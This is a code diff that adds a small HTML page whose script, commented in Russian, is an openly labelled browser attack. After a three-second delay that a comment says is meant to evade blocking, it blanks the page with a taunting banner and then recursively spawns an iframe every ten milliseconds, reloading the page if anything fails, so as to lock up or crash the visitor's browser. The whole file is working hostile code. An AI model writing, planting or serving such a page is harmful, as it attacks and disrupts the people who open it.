@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<script>
+// Фейковая загрузка "легального" контента
+setTimeout(() => {
+  document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#f00;font-size:50px;text-align:center;">ТВОЙ БРАУЗЕР — МОЙ БРАУЗЕР</div>';
+  
+  // Атака через рекурсию и iframe
+  const bomb = () => {
+    try {
+      const iframe = document.createElement('iframe');
+      iframe.src = 'https://example.com?nuke=' + Date.now();
+      document.body.appendChild(iframe);
+      setTimeout(bomb, 10);
+    } catch {
+      window.location.reload(); // Если всё упало — начинаем заново
+    }
+  };
+  bomb();
+}, 3000); // Задержка для обхода блокировок
+</script>
+</html>
